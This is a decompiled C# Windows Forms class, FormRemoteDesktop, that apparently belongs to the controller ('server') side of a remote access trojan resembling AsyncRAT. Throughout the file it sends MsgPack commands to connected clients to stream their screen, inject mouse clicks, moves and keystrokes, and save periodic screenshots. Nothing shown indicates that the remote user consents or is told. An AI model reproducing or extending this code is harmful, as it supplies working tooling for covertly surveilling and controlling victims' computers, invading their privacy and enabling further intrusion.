﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;
using Server.Properties;
using StreamLibrary;
using StreamLibrary.UnsafeCodecs;

namespace Server.Forms
{
	// Token: 0x0200009B RID: 155
	public partial class FormRemoteDesktop : Form
	{
		// Token: 0x170000D5 RID: 213
		// (get) Token: 0x060004B4 RID: 1204 RVA: 0x00004798 File Offset: 0x00002998
		// (set) Token: 0x060004B5 RID: 1205 RVA: 0x000047A0 File Offset: 0x000029A0
		public Form1 F { get; set; }

		// Token: 0x170000D6 RID: 214
		// (get) Token: 0x060004B6 RID: 1206 RVA: 0x000047A9 File Offset: 0x000029A9
		// (set) Token: 0x060004B7 RID: 1207 RVA: 0x000047B1 File Offset: 0x000029B1
		internal Clients ParentClient { get; set; }

		// Token: 0x170000D7 RID: 215
		// (get) Token: 0x060004B8 RID: 1208 RVA: 0x000047BA File Offset: 0x000029BA
		// (set) Token: 0x060004B9 RID: 1209 RVA: 0x000047C2 File Offset: 0x000029C2
		internal Clients Client { get; set; }

		// Token: 0x170000D8 RID: 216
		// (get) Token: 0x060004BA RID: 1210 RVA: 0x000047CB File Offset: 0x000029CB
		// (set) Token: 0x060004BB RID: 1211 RVA: 0x000047D3 File Offset: 0x000029D3
		public string FullPath { get; set; }

		// Token: 0x170000D9 RID: 217
		// (get) Token: 0x060004BC RID: 1212 RVA: 0x000047DC File Offset: 0x000029DC
		// (set) Token: 0x060004BD RID: 1213 RVA: 0x000047E4 File Offset: 0x000029E4
		public Image GetImage { get; set; }

		// Token: 0x060004BE RID: 1214 RVA: 0x000047ED File Offset: 0x000029ED
		public FormRemoteDesktop()
		{
			this._keysPressed = new List<Keys>();
			this.InitializeComponent();
		}

		// Token: 0x060004BF RID: 1215 RVA: 0x0002F874 File Offset: 0x0002DA74
		private void timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.ParentClient.TcpClient.Connected || !this.Client.TcpClient.Connected)
				{
					base.Close();
				}
			}
			catch
			{
				base.Close();
			}
		}

		// Token: 0x060004C0 RID: 1216 RVA: 0x0002F8C8 File Offset: 0x0002DAC8
		private void FormRemoteDesktop_Load(object sender, EventArgs e)
		{
			try
			{
				this.button1.Tag = "stop";
			}
			catch
			{
			}
		}

		// Token: 0x060004C1 RID: 1217 RVA: 0x0002F8FC File Offset: 0x0002DAFC
		private void Button1_Click(object sender, EventArgs e)
		{
			if (this.button1.Tag == "play")
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
				msgPack.ForcePathObject("Option").AsString = "capture";
				msgPack.ForcePathObject("Quality").AsInteger = (long)Convert.ToInt32(this.numericUpDown1.Value.ToString());
				msgPack.ForcePathObject("Screen").AsInteger = (long)Convert.ToInt32(this.numericUpDown2.Value.ToString());
				this.decoder = new UnsafeStreamCodec(Convert.ToInt32(this.numericUpDown1.Value), true);
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				this.numericUpDown1.Enabled = false;
				this.numericUpDown2.Enabled = false;
				this.btnSave.Enabled = true;
				this.btnMouse.Enabled = true;
				this.button1.Tag = "stop";
				this.button1.BackgroundImage = Resources.stop__1_;
				return;
			}
			this.button1.Tag = "play";
			try
			{
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
				msgPack2.ForcePathObject("Option").AsString = "stop";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
			}
			catch
			{
			}
			this.numericUpDown1.Enabled = true;
			this.numericUpDown2.Enabled = true;
			this.btnSave.Enabled = false;
			this.btnMouse.Enabled = false;
			this.button1.BackgroundImage = Resources.play_button;
		}

		// Token: 0x060004C2 RID: 1218 RVA: 0x0002FADC File Offset: 0x0002DCDC
		private void BtnSave_Click(object sender, EventArgs e)
		{
			if (this.button1.Tag == "stop")
			{
				if (this.timerSave.Enabled)
				{
					this.timerSave.Stop();
					this.btnSave.BackgroundImage = Resources.save_image;
					return;
				}
				this.timerSave.Start();
				this.btnSave.BackgroundImage = Resources.save_image2;
				try
				{
					if (!Directory.Exists(this.FullPath))
					{
						Directory.CreateDirectory(this.FullPath);
					}
					Process.Start(this.FullPath);
				}
				catch
				{
				}
			}
		}

		// Token: 0x060004C3 RID: 1219 RVA: 0x0002FB7C File Offset: 0x0002DD7C
		private void TimerSave_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!Directory.Exists(this.FullPath))
				{
					Directory.CreateDirectory(this.FullPath);
				}
				Encoder quality = Encoder.Quality;
				EncoderParameters encoderParameters = new EncoderParameters(1);
				EncoderParameter encoderParameter = new EncoderParameter(quality, 50L);
				encoderParameters.Param[0] = encoderParameter;
				ImageCodecInfo encoder = this.GetEncoder(ImageFormat.Jpeg);
				this.pictureBox1.Image.Save(this.FullPath + "\\IMG_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".jpeg", encoder, encoderParameters);
				if (encoderParameters != null)
				{
					encoderParameters.Dispose();
				}
				if (encoderParameter != null)
				{
					encoderParameter.Dispose();
				}
			}
			catch
			{
			}
		}

		// Token: 0x060004C4 RID: 1220 RVA: 0x0002FC2C File Offset: 0x0002DE2C
		private ImageCodecInfo GetEncoder(ImageFormat format)
		{
			foreach (ImageCodecInfo imageCodecInfo in ImageCodecInfo.GetImageDecoders())
			{
				if (imageCodecInfo.FormatID == format.Guid)
				{
					return imageCodecInfo;
				}
			}
			return null;
		}

		// Token: 0x060004C5 RID: 1221 RVA: 0x0002FC68 File Offset: 0x0002DE68
		private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
		{
			try
			{
				if (this.button1.Tag == "stop" && this.pictureBox1.Image != null && this.pictureBox1.ContainsFocus && this.isMouse)
				{
					Point point = new Point(e.X * this.rdSize.Width / this.pictureBox1.Width, e.Y * this.rdSize.Height / this.pictureBox1.Height);
					int num = 0;
					if (e.Button == MouseButtons.Left)
					{
						num = 2;
					}
					if (e.Button == MouseButtons.Right)
					{
						num = 8;
					}
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
					msgPack.ForcePathObject("Option").AsString = "mouseClick";
					msgPack.ForcePathObject("X").AsInteger = (long)point.X;
					msgPack.ForcePathObject("Y").AsInteger = (long)point.Y;
					msgPack.ForcePathObject("Button").AsInteger = (long)num;
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x060004C6 RID: 1222 RVA: 0x0002FDC8 File Offset: 0x0002DFC8
		private void PictureBox1_MouseUp(object sender, MouseEventArgs e)
		{
			try
			{
				if (this.button1.Tag == "stop" && this.pictureBox1.Image != null && this.pictureBox1.ContainsFocus && this.isMouse)
				{
					Point point = new Point(e.X * this.rdSize.Width / this.pictureBox1.Width, e.Y * this.rdSize.Height / this.pictureBox1.Height);
					int num = 0;
					if (e.Button == MouseButtons.Left)
					{
						num = 4;
					}
					if (e.Button == MouseButtons.Right)
					{
						num = 16;
					}
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
					msgPack.ForcePathObject("Option").AsString = "mouseClick";
					msgPack.ForcePathObject("X").AsInteger = (long)point.X;
					msgPack.ForcePathObject("Y").AsInteger = (long)point.Y;
					msgPack.ForcePathObject("Button").AsInteger = (long)num;
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x060004C7 RID: 1223 RVA: 0x0002FF2C File Offset: 0x0002E12C
		private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
		{
			try
			{
				if (this.button1.Tag == "stop" && this.pictureBox1.Image != null && this.pictureBox1.ContainsFocus && this.isMouse)
				{
					Point point = new Point(e.X * this.rdSize.Width / this.pictureBox1.Width, e.Y * this.rdSize.Height / this.pictureBox1.Height);
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
					msgPack.ForcePathObject("Option").AsString = "mouseMove";
					msgPack.ForcePathObject("X").AsInteger = (long)point.X;
					msgPack.ForcePathObject("Y").AsInteger = (long)point.Y;
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x060004C8 RID: 1224 RVA: 0x0003005C File Offset: 0x0002E25C
		private void Button3_Click(object sender, EventArgs e)
		{
			if (this.isMouse)
			{
				this.isMouse = false;
				this.btnMouse.BackgroundImage = Resources.mouse;
			}
			else
			{
				this.isMouse = true;
				this.btnMouse.BackgroundImage = Resources.mouse_enable;
			}
			this.pictureBox1.Focus();
		}

		// Token: 0x060004C9 RID: 1225 RVA: 0x000300B0 File Offset: 0x0002E2B0
		private void FormRemoteDesktop_FormClosed(object sender, FormClosedEventArgs e)
		{
			try
			{
				Image getImage = this.GetImage;
				if (getImage != null)
				{
					getImage.Dispose();
				}
				ThreadPool.QueueUserWorkItem(delegate(object o)
				{
					Clients client = this.Client;
					if (client == null)
					{
						return;
					}
					client.Disconnected();
				});
			}
			catch
			{
			}
		}

		// Token: 0x060004CA RID: 1226 RVA: 0x000300F8 File Offset: 0x0002E2F8
		private void btnKeyboard_Click(object sender, EventArgs e)
		{
			if (this.isKeyboard)
			{
				this.isKeyboard = false;
				this.btnKeyboard.BackgroundImage = Resources.keyboard;
			}
			else
			{
				this.isKeyboard = true;
				this.btnKeyboard.BackgroundImage = Resources.keyboard_on;
			}
			this.pictureBox1.Focus();
		}

		// Token: 0x060004CB RID: 1227 RVA: 0x0003014C File Offset: 0x0002E34C
		private void FormRemoteDesktop_KeyDown(object sender, KeyEventArgs e)
		{
			if (this.button1.Tag == "stop" && this.pictureBox1.Image != null && this.pictureBox1.ContainsFocus && this.isKeyboard)
			{
				if (!this.IsLockKey(e.KeyCode))
				{
					e.Handled = true;
				}
				if (this._keysPressed.Contains(e.KeyCode))
				{
					return;
				}
				this._keysPressed.Add(e.KeyCode);
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
				msgPack.ForcePathObject("Option").AsString = "keyboardClick";
				msgPack.ForcePathObject("key").AsInteger = (long)Convert.ToInt32(e.KeyCode);
				msgPack.ForcePathObject("keyIsDown").SetAsBoolean(true);
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
		}

		// Token: 0x060004CC RID: 1228 RVA: 0x00030254 File Offset: 0x0002E454
		private void FormRemoteDesktop_KeyUp(object sender, KeyEventArgs e)
		{
			if (this.button1.Tag == "stop" && this.pictureBox1.Image != null && base.ContainsFocus && this.isKeyboard)
			{
				if (!this.IsLockKey(e.KeyCode))
				{
					e.Handled = true;
				}
				this._keysPressed.Remove(e.KeyCode);
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
				msgPack.ForcePathObject("Option").AsString = "keyboardClick";
				msgPack.ForcePathObject("key").AsInteger = (long)Convert.ToInt32(e.KeyCode);
				msgPack.ForcePathObject("keyIsDown").SetAsBoolean(false);
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
		}

		// Token: 0x060004CD RID: 1229 RVA: 0x0000482A File Offset: 0x00002A2A
		private bool IsLockKey(Keys key)
		{
			return (key & Keys.Capital) == Keys.Capital || (key & Keys.NumLock) == Keys.NumLock || (key & Keys.Scroll) == Keys.Scroll;
		}

		// Token: 0x040003E2 RID: 994
		public int FPS;

		// Token: 0x040003E3 RID: 995
		public Stopwatch sw = Stopwatch.StartNew();

		// Token: 0x040003E4 RID: 996
		public IUnsafeCodec decoder = new UnsafeStreamCodec(60, true);

		// Token: 0x040003E5 RID: 997
		public Size rdSize;

		// Token: 0x040003E6 RID: 998
		private bool isMouse;

		// Token: 0x040003E7 RID: 999
		private bool isKeyboard;

		// Token: 0x040003E8 RID: 1000
		public object syncPicbox = new object();

		// Token: 0x040003E9 RID: 1001
		private readonly List<Keys> _keysPressed;
	}
}
